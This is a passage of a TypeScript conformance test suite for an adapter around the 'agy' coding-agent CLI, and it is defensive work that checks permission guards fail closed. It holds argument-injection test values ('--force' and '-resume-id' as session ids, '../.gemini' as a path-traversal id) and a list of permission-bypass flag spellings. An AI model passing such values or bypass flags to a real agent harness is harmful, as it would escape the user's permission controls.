    for (const provider of ["claude", "codex", "grok", "cursor", "opencode", "kimi", "muse", "fake", "other"]) {
      expect(
        a.resumeArgs({ provider: provider as ProviderId, nativeSessionId: id }, customReq, approved),
      ).toMatchObject({
        ineligible: true,
        reason: "CAPABILITY_MISSING",
        detail: `binding is for ${provider}`,
      });
    }

    // Ineligible non-privileged profiles
    for (const name of PROFILES) {
      expect(a.resumeArgs({ provider: "antigravity", nativeSessionId: id }, customReq, profileOf(name))).toMatchObject({
        ineligible: true,
        reason: "PROFILE_UNSUPPORTED",
      });
    }

    // Dangerous / unsafe session ids fail closed
    for (const bad of ["--force", "-f", "chat x", "../chat", "a".repeat(257), ""]) {
      expect(a.resumeArgs({ provider: "antigravity", nativeSessionId: bad }, customReq, approved), bad).toMatchObject({
        ineligible: true,
        reason: "CAPABILITY_MISSING",
      });
    }
  });
});

/**
 * T4.35 (FR-ADP-11): the shared conformance suite over synthetic recorded fixtures (`./fixtures/*.jsonl`, in the
 * `stream-json` shapes of the 2026-10-14 live check), replayed by `replay.mjs --provider antigravity` in place of the
 * binary, so it passes with no `agy` installed. The prompt reaches the replay as the `--prompt=` argv word. Resume
 * compiles `--conversation <id>` (owner decision 67, T4.35), so every FR-ADP-11 kind runs in the suite.
 */
describe("antigravity conformance suite (synthetic recorded fixtures, FR-ADP-11, T4.35)", () => {
  const caseOf = (kind: ConformanceCase["kind"]): ConformanceCase => {
    const c = antigravityConformanceCases(makeCwd).find((x) => x.kind === kind);
    if (!c) throw new Error(`missing ${kind} case`);
    return c;
  };
  const shapeRequest = (): CompileRequest => ({
    runId: "run_antigravity_shape",
    objective: "synthetic antigravity objective",
    constraints: [],
    workspace: { cwd: makeCwd(), writable: true },
    bypassApproved: true,
  });
  /**
   * `a` with `compile` replaced. A Proxy that binds every other method to `a`, because the adapter's private `#`
   * members throw on an `Object.create` copy (the run would end `OUTPUT_PROTOCOL_ERROR` for that reason alone).
   */
  const withCompile = (a: AntigravityAdapter, compile: AntigravityAdapter["compile"]): AntigravityAdapter =>
    new Proxy(a, {
      get(target, key) {
        if (key === "compile") return compile;
        const v: unknown = Reflect.get(target, key, target);
        return typeof v === "function" ? v.bind(target) : v;
      },
    });
  /** A copy of `a` whose compiled invocation is rewritten by `edit`, to show the replay refuses a wrong compile. */
  const brokenBy = (a: AntigravityAdapter, edit: (inv: Invocation) => Invocation): AntigravityAdapter =>
    withCompile(a, (r, p) => {
      const inv = a.compile(r, p);
      if ("ineligible" in inv) return inv;
      return { ...edit(inv), policyFlags: [] };
    });

  it("names every FR-ADP-11 kind and passes the suite for every kind, resume included (owner decision 67)", async () => {
    const cases = antigravityConformanceCases(makeCwd);
    expect(missingRequiredKinds(cases)).toEqual([]);
    expect(ANTIGRAVITY_RUNNABLE_KINDS).toContain("resume");
    const runnable = cases.filter((c) => ANTIGRAVITY_RUNNABLE_KINDS.includes(c.kind));
    expect(runnable).toHaveLength(cases.length);
    const report = await runConformanceSuite(runnable);
    const failing = report.cases.flatMap((c) =>
      c.checks.filter((k) => !k.ok).map((k) => `${c.kind}: ${k.name} ${k.detail ?? ""}`),
    );
    expect(failing).toEqual([]);
    expect(report.ok).toBe(true);
  });

  it("resume with the same conversation_id succeeds through resumeArgs and keeps the id (C9 run 2)", async () => {
    const report = await runConformanceCase(caseOf("resume"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, nativeSessionId: RESUMED_SESSION_ID });
    // Without --conversation the replay refuses the resume fixture (requireResume), so it cannot pass as a fresh run.
    const { binding: _binding, ...c } = caseOf("resume");
    const fresh = await runConformanceCase(c);
    expect(fresh.result).toMatchObject({ ok: false, failureDetail: "exit code 64" });
  });

  it("resume to a different conversation_id (C9 run 5: an unknown id starts a new one) fails closed", async () => {
    const c = caseOf("resume");
    const report = await runConformanceCase({
      ...c,
      adapter: replayAdapter("resume_unknown_id"),
      expect: {
        ok: false,
        failureCode: "OUTPUT_PROTOCOL_ERROR",
        failureDetail: "protocol: resumed conversation id differs from the requested one",
        nativeSessionId: null,
      },
    });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.ok).toBe(true);
  });

  it("resume with no conversation_id in the stream fails closed", async () => {
    const c = caseOf("resume");
    const report = await runConformanceCase({
      ...c,
      adapter: replayAdapter("resume_missing_id"),
      expect: {
        ok: false,
        failureCode: "OUTPUT_PROTOCOL_ERROR",
        failureDetail: "protocol: resume returned no conversation id",
        nativeSessionId: null,
      },
    });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.ok).toBe(true);
  });

  it("a resumed C10 zero-token SUCCESS (resume_failure) is TOOL_FAILURE and keeps the --conversation id", async () => {
    const c = caseOf("resume");
    const report = await runConformanceCase({
      ...c,
      adapter: replayAdapter("resume_failure"),
      expect: {
        ok: false,
        failureCode: "TOOL_FAILURE",
        failureDetail: "SUCCESS with no reported tokens",
        nativeSessionId: RESUMED_SESSION_ID,
      },
    });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
  });

  it("the case list replays the exit 3 and unrecorded usage shapes, both cancellation paths, and not the sandbox gap", () => {
    const cases = antigravityConformanceCases(makeCwd);
    const replays = (fixture: string) =>
      cases.filter((x) => {
        const inv = x.adapter.compile(x.request, x.profile);
        return !("ineligible" in inv) && inv.argv.includes(fixturePath(fixture));
      });
    for (const fixture of [
      "agy_error_exit3",
      "usage_unrecorded",
      "rate_limit",
      "rate_limit_error",
      "sandbox_violation_error",
    ]) {
      expect(replays(fixture).map((x) => [x.kind, x.expect.failureCode])).toEqual([["task_failure", "TOOL_FAILURE"]]);
    }
    expect(replays("unknown_events").map((x) => [x.kind, x.expect.failureCode])).toEqual([
      ["malformed_output", "OUTPUT_PROTOCOL_ERROR"],
    ]);
    expect(replays("git_write_guard_args").map((x) => [x.kind, x.expect.failureCode])).toEqual([
      ["task_failure", "PERMISSION_BLOCKED"],
    ]);
    expect(replays("denied_not_array").map((x) => [x.kind, x.expect.failureCode])).toEqual([
      ["task_failure", "PERMISSION_BLOCKED"],
    ]);
    expect(replays("step_conversation_changed").map((x) => [x.kind, x.expect.failureCode])).toEqual([
      ["malformed_output", "OUTPUT_PROTOCOL_ERROR"],
    ]);
    expect(replays("backing_provider").map((x) => [x.kind, x.expect.ok])).toEqual([["success", true]]);
    expect(replays("sandbox_violation_unrecorded")).toEqual([]);
    const cancels = cases.filter((x) => x.kind === "cancellation");
    const argvOf = (x: ConformanceCase) => {
      const inv = x.adapter.compile(x.request, x.profile);
      return "ineligible" in inv ? [] : inv.argv;
    };
    expect(cancels.map((x) => argvOf(x).includes("--ignore-term"))).toEqual([true, false]);
  });

  it("success with edit normalizes conversation id, summary and the edit; usage is provider_reported", async () => {
    const c = caseOf("success");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({
      ok: true,
      nativeSessionId: DEFAULT_SESSION_ID,
      summary: "Added hello.txt.",
      unknownEventCount: 0,
    });
    expect(readFileSync(join(c.request.workspace.cwd, "hello.txt"), "utf8")).toContain("synthetic");
  });

  it("SUCCESS with zero tokens at exit 0 (live check C10, Q-86) is TOOL_FAILURE and keeps the conversation id", async () => {
    const report = await runConformanceCase(caseOf("task_failure"));
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("a soft-denied shell command at exit 0 (live check C7) is PERMISSION_BLOCKED", async () => {
    const c = antigravityConformanceCases(makeCwd).find((x) => x.expect.failureCode === "PERMISSION_BLOCKED");
    if (!c) throw new Error("missing permission_denied case");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("a logged-out ERROR envelope at exit 1 (live check C13) ends AUTH_REQUIRED, not a success", async () => {
    const report = await runConformanceCase(caseOf("auth_missing"));
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({ ok: false, failureCode: "AUTH_REQUIRED" });
  });

  /** The first case whose expectation matches `pick` (several cases share a kind). */
  const caseWhere = (name: string, pick: (e: ConformanceCase["expect"]) => boolean): ConformanceCase => {
    const c = antigravityConformanceCases(makeCwd).find((x) => pick(x.expect));
    if (!c) throw new Error(`missing ${name} case`);
    return c;
  };

  it("an invalid model ERROR envelope at exit 1 (live check C10) is MODEL_UNAVAILABLE and binds no session", async () => {
    const report = await runConformanceCase(
      caseWhere("model_unavailable", (e) => e.failureCode === "MODEL_UNAVAILABLE"),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "MODEL_UNAVAILABLE" });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it("a slash-command SUCCESS envelope with no turn (live check C6) is TOOL_FAILURE; its command key is ignored", async () => {
    const report = await runConformanceCase(
      caseWhere(
        "slash_command",
        (e) => e.failureCode === "TOOL_FAILURE" && e.nativeSessionId === null && !e.mutatedPath,
      ),
    );
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", unknownEventCount: 0 });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it("a write before a soft-denied command (live check C18 run 2) is PERMISSION_BLOCKED and the write stays", async () => {
    const c = caseWhere("denied_after_write", (e) => e.mutatedPath === "b.txt");
    const report = await runConformanceCase(c);
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(readFileSync(join(c.request.workspace.cwd, "b.txt"), "utf8")).toContain("synthetic");
  });

  /** The one case that replays `fixture` (several cases share a kind and an expectation). */
  const caseFor = (fixture: string): ConformanceCase => {
    const want = fixturePath(fixture);
    const c = antigravityConformanceCases(makeCwd).find((x) => {
      const inv = x.adapter.compile(x.request, x.profile);
      return !("ineligible" in inv) && inv.argv.includes(want);
    });
    if (!c) throw new Error(`missing ${fixture} case`);
    return c;
  };

  it("a Git write no benign or empty tool parameter can shadow ends PERMISSION_BLOCKED through the run (PR #387, ADR-0039)", async () => {
    // Each fixture has a SUCCESS envelope with tokens and no denial, so only the tool-call guard can fail it. A parser
    // that read only the first key (empty `command`) or the first container (`parameters.command: ls`) replays both
    // fixtures to `ok`.
    for (const [fixture, command, summary] of [
      ["git_write_shadow_empty", "push", "Pushed."],
      ["git_write_shadow_container", "tag", "Listed."],
    ] as const) {
      const report = await runConformanceCase(caseFor(fixture));
      expect(report.checks.filter((k) => !k.ok)).toEqual([]);
      expect(report.result).toMatchObject({
        ok: false,
        failureCode: "PERMISSION_BLOCKED",
        failureDetail: `git write attempted: \`git ${command}\` can create commits, change refs or push`,
        nativeSessionId: DEFAULT_SESSION_ID,
        summary,
      });
    }
  });

  it("a non-array denied_actions value is one denial: PERMISSION_BLOCKED, conversation id kept", async () => {
    const report = await runConformanceCase(caseFor("denied_not_array"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "PERMISSION_BLOCKED",
      failureDetail: "denied: unknown",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("a /credits SUCCESS envelope with no turn (live check C6) is TOOL_FAILURE and binds no session", async () => {
    const report = await runConformanceCase(caseFor("credits_command"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", unknownEventCount: 0 });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it.each([
    ["a stream with no result line at exit 0", "no_result", "no result event"],
    ["a second, successful result after a C10 zero-token one", "two_results", "protocol: more than one result line"],
    ["a result for another conversation", "conversation_changed", "protocol: conversation id changed mid-run"],
    ["a step for another conversation", "step_conversation_changed", "protocol: conversation id changed mid-run"],
    [
      "an unsafe conversation id after a bound one",
      "unsafe_id_after_bound",
      "protocol: conversation id is not a safe token",
    ],
  ])("%s is OUTPUT_PROTOCOL_ERROR and keeps the first conversation id", async (_n, fixture, detail) => {
    const report = await runConformanceCase(caseFor(fixture));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: detail,
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("a SUCCESS envelope with tokens at exit 1 is TOOL_FAILURE and the write stays: the exit code is not overridden", async () => {
    const c = caseWhere("success_exit_1", (e) => e.mutatedPath === "hello.txt" && !e.ok);
    const report = await runConformanceCase(c);
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE", failureDetail: "exit code 1" });
    expect(readFileSync(join(c.request.workspace.cwd, "hello.txt"), "utf8")).toContain("synthetic");
  });

  it("an unrecorded event kind in a success is counted as unknown and does not change the result", async () => {
    const report = await runConformanceCase(caseFor("unknown_event"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, nativeSessionId: DEFAULT_SESSION_ID, unknownEventCount: 1 });
  });

  it("invented rate-limit text in an ERROR envelope at exit 1 is TOOL_FAILURE: no rate-limit shape is recorded", async () => {
    const report = await runConformanceCase(caseFor("rate_limit_unrecorded"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("an unsafe conversation id in a SUCCESS envelope binds nothing and is OUTPUT_PROTOCOL_ERROR", async () => {
    const report = await runConformanceCase(caseFor("unsafe_conversation_id"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "protocol: conversation id is not a safe token",
    });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it("a tool step after a clean result line is OUTPUT_PROTOCOL_ERROR and keeps the conversation id", async () => {
    const report = await runConformanceCase(caseFor("trailing_tool"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "tool call after the result line",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("a Git write under a SUCCESS envelope with no denial ends PERMISSION_BLOCKED through the run (ADR-0039)", async () => {
    const report = await runConformanceCase(caseFor("git_write_guard"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(report.result?.failureDetail).toContain("git write attempted");
  });

  it("a backing_provider SUCCESS envelope (T4.6, FR-ADP-10) normalizes ok, session id and does not fail", async () => {
    const report = await runConformanceCase(caseFor("backing_provider"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: true, nativeSessionId: DEFAULT_SESSION_ID });
  });

  it("an empty stream at exit 1 (rate limit never forced) replays to TOOL_FAILURE, never RATE_LIMIT_TRANSIENT", async () => {
    const report = await runConformanceCase(caseFor("rate_limit"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it("an in-stream ERROR envelope at exit 0 with rate-limit text replays to TOOL_FAILURE, never RATE_LIMIT_TRANSIENT", async () => {
    const report = await runConformanceCase(caseFor("rate_limit_error"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("an in-stream ERROR envelope at exit 0 with sandbox-violation text replays to TOOL_FAILURE, never SANDBOX_VIOLATION", async () => {
    // No sandbox shape is recorded (T4.33): the text is an unmapped provider error, so the run fails closed as
    // TOOL_FAILURE. The detected SANDBOX_VIOLATION path stays pinned at the parser level only.
    const report = await runConformanceCase(caseFor("sandbox_violation_error"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
      failureDetail: "unknown: sandbox: operation denied by seccomp profile",
      nativeSessionId: DEFAULT_SESSION_ID,
    });
  });

  it("multiple unreadable/unrecognized event lines at exit 0 replay to OUTPUT_PROTOCOL_ERROR with counted unknown events and no session bound", async () => {
    const report = await runConformanceCase(caseFor("unknown_events"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      unknownEventCount: 5,
    });
    expect(report.result?.nativeSessionId).toBeUndefined();
  });

  it("a Git write under args.CommandLine in a SUCCESS envelope ends PERMISSION_BLOCKED (ADR-0039)", async () => {
    const report = await runConformanceCase(caseFor("git_write_guard_args"));
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
    expect(report.result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    expect(report.result?.failureDetail).toContain("git write attempted");
  });

  it("names no rate_limit case and expects no RATE_LIMIT_TRANSIENT or SANDBOX_VIOLATION (no recorded shape, T4.33)", () => {
    const cases = antigravityConformanceCases(makeCwd);
    expect(cases.filter((c) => c.kind === "rate_limit")).toEqual([]);
    const codes = cases.map((c) => c.expect.failureCode);
    expect(codes).not.toContain("RATE_LIMIT_TRANSIENT");
    expect(codes).not.toContain("SANDBOX_VIOLATION");
  });

  it("partial mutation leaves the file in the cwd", async () => {
    const c = caseOf("partial_mutation");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(readFileSync(join(c.request.workspace.cwd, "partial.txt"), "utf8")).toContain("synthetic");
  });

  it("hang that ignores SIGTERM is cancelled with the process group empty", async () => {
    const c = antigravityConformanceCases(makeCwd).find(
      (x) =>
        x.kind === "cancellation" &&
        !("ineligible" in x.adapter.compile(x.request, x.profile)) &&
        (x.adapter.compile(x.request, x.profile) as Invocation).argv.includes("--ignore-term"),
    );
    if (!c) throw new Error("missing cancellation ignoreTerm case");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(report.checks.find((k) => k.name === "process group empty after run")?.ok).toBe(true);
  });

  it("hang that honours SIGTERM is cancelled cleanly", async () => {
    const c = antigravityConformanceCases(makeCwd).find(
      (x) =>
        x.kind === "cancellation" &&
        !("ineligible" in x.adapter.compile(x.request, x.profile)) &&
        !(x.adapter.compile(x.request, x.profile) as Invocation).argv.includes("--ignore-term"),
    );
    if (!c) throw new Error("missing cancellation normal case");
    const report = await runConformanceCase(c);
    expect(report.ok).toBe(true);
    expect(report.result).toMatchObject({ ok: false, failureCode: "CANCELLED" });
  });

  it("positive control: the same wrapper with the compile unchanged passes, so each refusal below is the replay's", async () => {
    const report = await runConformanceCase({
      kind: "success",
      adapter: brokenBy(replayAdapter("success_edit"), (inv) => ({ ...inv, policyFlags: inv.policyFlags })),
      request: shapeRequest(),
      profile: PRIVILEGED_BYPASS_PROFILE,
      expect: { ok: true, nativeSessionId: DEFAULT_SESSION_ID },
    });
    expect(report.checks.filter((k) => !k.ok)).toEqual([]);
  });

  const argvEdit =
    (edit: (argv: string[]) => string[]) =>
    (inv: Invocation): Invocation => ({ ...inv, argv: edit(inv.argv) });
  it.each([
    [
      "--dangerously-skip-permissions removed",
      argvEdit((a) => a.filter((w) => w !== "--dangerously-skip-permissions")),
    ],
    ["--prompt= removed", argvEdit((a) => a.filter((w) => !w.startsWith("--prompt=")))],
    ["--sandbox added", argvEdit((a) => [...a, "--sandbox"])],
    ["--model added", argvEdit((a) => [...a, "--model", "synthetic-model"])],
    ["--continue added", argvEdit((a) => [...a, "--continue"])],
    ["-dangerously-skip-permissions added", argvEdit((a) => [...a, "-dangerously-skip-permissions"])],
    ["--gemini_dir= added", argvEdit((a) => [...a, "--gemini_dir=/tmp/synthetic"])],
    // agy parses like Go's flag package (ADR-0045): a repeated flag keeps its last value, and one or two dashes and
    // `=value` name the same flag, so these would override what the dialect reads (2026-10-15, Delegated). A bool
    // flag's `=false` beside the bare word is the same hole. Parsing also stops at `--` or a positional, and an
    // unknown flag is rejected (live check C3), so those shapes exit 64 instead of replaying a success.
    ["a second --output-format json", argvEdit((a) => [...a, "--output-format", "json"])],
    ["-output-format=json added", argvEdit((a) => [...a, "-output-format=json"])],
    [
      "--output-format=stream-json in place of the two words",
      argvEdit((a) => {
        const i = a.indexOf("--output-format");
        return [...a.slice(0, i), "--output-format=stream-json", ...a.slice(i + 2)];
      }),
    ],
    ["a second --prompt= word", argvEdit((a) => [...a, "--prompt=synthetic other prompt"])],
    ["--dangerously-skip-permissions=false added", argvEdit((a) => [...a, "--dangerously-skip-permissions=false"])],
    ["--dangerously-skip-permissions=true added", argvEdit((a) => [...a, "--dangerously-skip-permissions=true"])],
    ["--conversation with a flag-like id", argvEdit((a) => [...a, "--conversation", "-resume-id"])],
    ["--conversation with an empty id", argvEdit((a) => [...a, "--conversation", ""])],
    ["-conversation added", argvEdit((a) => [...a, "-conversation", RESUMED_SESSION_ID])],
    ["-prompt= added", argvEdit((a) => [...a, "-prompt=synthetic other prompt"])],
    ["-p= added", argvEdit((a) => [...a, "-p=synthetic other prompt"])],
    ["--p added", argvEdit((a) => [...a, "--p", "synthetic other prompt"])],
    ["-sandbox added", argvEdit((a) => [...a, "-sandbox"])],
    // Go's flag stops at `--` or the first non-flag word, and a bool flag does not take the next word. A bypass flag
    // that sits only after either would not reach agy, but a whole-argv scan used to count it and replay a success.
    // An unknown flag, including an underscore spelling, is "flag provided but not defined" (live check C3).
    [
      "-- before --dangerously-skip-permissions",
      argvEdit((a) => {
        const i = a.indexOf("--dangerously-skip-permissions");
        return [...a.slice(0, i), "--", ...a.slice(i)];
      }),
    ],
    [
      "a positional before --dangerously-skip-permissions",
      argvEdit((a) => {
        const i = a.indexOf("--dangerously-skip-permissions");
        return [...a.slice(0, i), "false", ...a.slice(i)];
      }),
    ],
    ["a trailing positional", argvEdit((a) => [...a, "extra"])],
    ["--debug added", argvEdit((a) => [...a, "--debug"])],
    ["--dangerously_skip_permissions added", argvEdit((a) => [...a, "--dangerously_skip_permissions"])],
    ["--dangerously-skip-permissions repeated", argvEdit((a) => [...a, "--dangerously-skip-permissions"])],
    [
      "--help before the compiled flags",
      argvEdit((a) => {
        const i = a.indexOf("--");
        return [...a.slice(0, i + 1), "--help", ...a.slice(i + 1)];
      }),
    ],
    [
      "--version before the compiled flags",
      argvEdit((a) => {
        const i = a.indexOf("--");
        return [...a.slice(0, i + 1), "--version", ...a.slice(i + 1)];
      }),
    ],
    ["bad flag syntax ---", argvEdit((a) => [...a, "---"])],
    ["--conversation= added", argvEdit((a) => [...a, `--conversation=${RESUMED_SESSION_ID}`])],
    ["--conversation with no id", argvEdit((a) => [...a, "--conversation"])],
    [
      "--conversation twice",
      argvEdit((a) => [...a, "--conversation", RESUMED_SESSION_ID, "--conversation", DEFAULT_SESSION_ID]),
    ],
    ["auto-update not disabled", (inv: Invocation): Invocation => ({ ...inv, env: {} })],
    [
      "auto-update set to a value other than true",
      (inv: Invocation): Invocation => ({ ...inv, env: { AGY_CLI_DISABLE_AUTO_UPDATE: "false" } }),
    ],
    [
      "GEMINI_API_KEY in the environment",
      (inv: Invocation): Invocation => ({
        ...inv,
        env: { ...inv.env, GEMINI_API_KEY: "synthetic-not-a-key" },
        envAllowlist: [...inv.envAllowlist, "GEMINI_API_KEY"],
      }),
    ],
    [
      "GOOGLE_API_KEY in the environment",
      (inv: Invocation): Invocation => ({
        ...inv,
        env: { ...inv.env, GOOGLE_API_KEY: "synthetic-not-a-key" },
        envAllowlist: [...inv.envAllowlist, "GOOGLE_API_KEY"],
      }),
    ],
    [
      "GOOGLE_GEMINI_BASE_URL in the environment",
      (inv: Invocation): Invocation => ({
        ...inv,
        env: { ...inv.env, GOOGLE_GEMINI_BASE_URL: "http://synthetic.example" },
        envAllowlist: [...inv.envAllowlist, "GOOGLE_GEMINI_BASE_URL"],
      }),
    ],
    [
      "GOOGLE_CLOUD_PROJECT in the environment",
      (inv: Invocation): Invocation => ({
        ...inv,
        env: { ...inv.env, GOOGLE_CLOUD_PROJECT: "synthetic-project" },
        envAllowlist: [...inv.envAllowlist, "GOOGLE_CLOUD_PROJECT"],
      }),
    ],
    [
      "--sandbox before --dangerously-skip-permissions",
      argvEdit((a) => {
        const i = a.indexOf("--dangerously-skip-permissions");
        return [...a.slice(0, i), "--sandbox", ...a.slice(i)];
      }),
    ],
    ["--agent added", argvEdit((a) => [...a, "--agent", "synthetic-agent"])],
    ["-agent added", argvEdit((a) => [...a, "-agent", "synthetic-agent"])],
    ["--effort added", argvEdit((a) => [...a, "--effort", "high"])],
    ["--input-format added", argvEdit((a) => [...a, "--input-format", "text"])],
    ["--disable-slash-commands added", argvEdit((a) => [...a, "--disable-slash-commands"])],
    ["-disable-slash-commands added", argvEdit((a) => [...a, "-disable-slash-commands"])],
    ["-i added", argvEdit((a) => [...a, "-i"])],
    ["--prompt-interactive added", argvEdit((a) => [...a, "--prompt-interactive"])],
    ["--new-project added", argvEdit((a) => [...a, "--new-project"])],
    ["--project added", argvEdit((a) => [...a, "--project", "synthetic-project"])],
    ["--log-file added", argvEdit((a) => [...a, "--log-file", "/tmp/synthetic.log"])],
    ["--json-schema added", argvEdit((a) => [...a, "--json-schema", "{}"])],
    [
      "-help before the compiled flags",
      argvEdit((a) => {
        const i = a.indexOf("--");
        return [...a.slice(0, i + 1), "-help", ...a.slice(i + 1)];
      }),
    ],
    [
      "-version before the compiled flags",
      argvEdit((a) => {
        const i = a.indexOf("--");
        return [...a.slice(0, i + 1), "-version", ...a.slice(i + 1)];
      }),
    ],
    // Declared bypass spellings and never-emitted C2 flags (providers.ts, adapter.ts header, live check C2/C7b/C17).
    // Go's flag keeps the last value, so an `=` form or a prompt alias beside the compiled word is the same flag.
    ["--yolo added", argvEdit((a) => [...a, "--yolo"])],
    ["--force added", argvEdit((a) => [...a, "--force"])],
    ["--always-approve added", argvEdit((a) => [...a, "--always-approve"])],
    ["--approve-mcps added", argvEdit((a) => [...a, "--approve-mcps"])],
    ["--full-auto added", argvEdit((a) => [...a, "--full-auto"])],
    ["--remote-control added", argvEdit((a) => [...a, "--remote-control"])],
    ["-remote-control added", argvEdit((a) => [...a, "-remote-control"])],
    ["--add-dir added", argvEdit((a) => [...a, "--add-dir", "/tmp/synthetic"])],
    ["-add-dir added", argvEdit((a) => [...a, "-add-dir", "/tmp/synthetic"])],
    ["-gemini_dir added", argvEdit((a) => [...a, "-gemini_dir", "/tmp/synthetic"])],
    ["--mode=plan added", argvEdit((a) => [...a, "--mode=plan"])],
    ["--print-timeout added", argvEdit((a) => [...a, "--print-timeout", "1s"])],
    ["-c added", argvEdit((a) => [...a, "-c"])],
    ["--sandbox=false added", argvEdit((a) => [...a, "--sandbox=false"])],
    ["--print= beside --prompt=", argvEdit((a) => [...a, "--print=synthetic other prompt"])],
    ["-p as two words beside --prompt=", argvEdit((a) => [...a, "-p", "synthetic other prompt"])],
    ["--output-format=json beside the two words", argvEdit((a) => [...a, "--output-format=json"])],
    ["a second --output-format stream-json", argvEdit((a) => [...a, "--output-format", "stream-json"])],
    [
      "--output-format removed",
      argvEdit((a) => a.filter((w, i) => w !== "--output-format" && a[i - 1] !== "--output-format")),
    ],
    [
      "--prompt as two words in place of --prompt=",
      argvEdit((a) => {
        const i = a.findIndex((w) => w.startsWith("--prompt="));
        const value = a[i]?.slice("--prompt=".length) ?? "";
        return [...a.slice(0, i), "--prompt", value, ...a.slice(i + 1)];
      }),
    ],
    [
      "-dangerously-skip-permissions in place of the bare word",
      argvEdit((a) => a.map((w) => (w === "--dangerously-skip-permissions" ? "-dangerously-skip-permissions" : w))),
    ],
    [
      "-h before the compiled flags",
      argvEdit((a) => {
        const i = a.indexOf("--");
        return [...a.slice(0, i + 1), "-h", ...a.slice(i + 1)];
      }),
    ],
    [
      "--h before the compiled flags",
      argvEdit((a) => {
        const i = a.indexOf("--");
        return [...a.slice(0, i + 1), "--h", ...a.slice(i + 1)];
      }),
    ],
    [
      "models positional before the compiled flags",
      argvEdit((a) => {
        const i = a.indexOf("--");
        return [...a.slice(0, i + 1), "models", ...a.slice(i + 1)];
      }),
    ],
    ["--config-dir added", argvEdit((a) => [...a, "--config-dir", "/tmp/synthetic"])],
    ["a trailing --", argvEdit((a) => [...a, "--"])],
    ["--conversation with a slash id", argvEdit((a) => [...a, "--conversation", "../.gemini"])],
    ["--conversation with a space in the id", argvEdit((a) => [...a, "--conversation", "not a token"])],
    ["--conversation id longer than 256 characters", argvEdit((a) => [...a, "--conversation", `a${"b".repeat(256)}`])],
    ["auto-update set to 1", (inv: Invocation): Invocation => ({ ...inv, env: { AGY_CLI_DISABLE_AUTO_UPDATE: "1" } })],
  ])(
    "the replay refuses an invocation agy would not be given (%s), so a wrong compile cannot pass",
    async (_n, edit) => {
      const report = await runConformanceCase({
        kind: "success",
        adapter: brokenBy(replayAdapter("success_edit"), edit),
        request: shapeRequest(),
        profile: PRIVILEGED_BYPASS_PROFILE,
        expect: { ok: true, nativeSessionId: DEFAULT_SESSION_ID },
      });
      expect(report.ok).toBe(false);
      expect(report.result?.ok).toBe(false);
      expect(report.result?.failureDetail).toBe("exit code 64");
    },
  );

  it("dialect probe answers single-word version and help variants and rejects non-probe invocations", () => {
    const probe = (argv: string[]): string | undefined => {
      try {
        return execFileSync(
          process.execPath,
